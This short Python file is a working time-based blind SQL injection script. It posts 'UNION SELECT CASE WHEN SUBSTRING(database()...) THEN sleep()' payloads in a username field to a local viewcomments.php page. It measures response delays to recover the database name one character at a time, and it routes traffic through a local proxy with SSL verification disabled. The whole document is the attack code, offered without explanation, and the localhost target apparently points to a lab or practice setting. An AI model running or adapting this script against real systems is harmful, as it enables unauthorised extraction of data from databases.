from pprint import pprint
import requests
import time
import sys

DEBUG = False
#Supress SSL warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

headers = {
'Accept': '*/*',
'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
'Connection': 'Close'
}

proxies = {
	'http': 'http://127.0.0.1:8080',
	'https': 'http://127.0.0.1:8080'
}

def s_print(string):
	if DEBUG:
		print(string)


def get_current_db_helper(url, i, dict, t = 3):
	for dictLet in dict:
		injection = "a' UNION SELECT CASE WHEN SUBSTRING(database(), %s, 1) = '%s' THEN sleep(%s) ELSE NULL END FROM DUAL WHERE 'a'='a" % (i, dictLet, t)


		tStart = time.time()
		res = requests.post(url, proxies=proxies, verify=False, data={'username': injection})
		tEnd = time.time()
		tElapsed = tEnd - tStart
		if res.status_code == 200:
			s_print('Elapsed time: ' + str(tElapsed))
			if tElapsed > t:
				sys.stdout.write(str(dictLet))
				sys.stdout.flush()
				return dictLet
		else:
			s_print('Something went wrong')
	return None

def get_current_db(dict):

	url = "http://127.0.0.1/viewcomments.php"
	dbName = ''
	i = 1
	while True:
		correctLet = get_current_db_helper(url, i, dict)
		if correctLet != None:
			dbName += correctLet
		else:
			print
			return dbName

		i += 1

if __name__ == "__main__":
	dict = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

	print("Bruteforcing combinations")
	print
	print(get_current_db(dict))
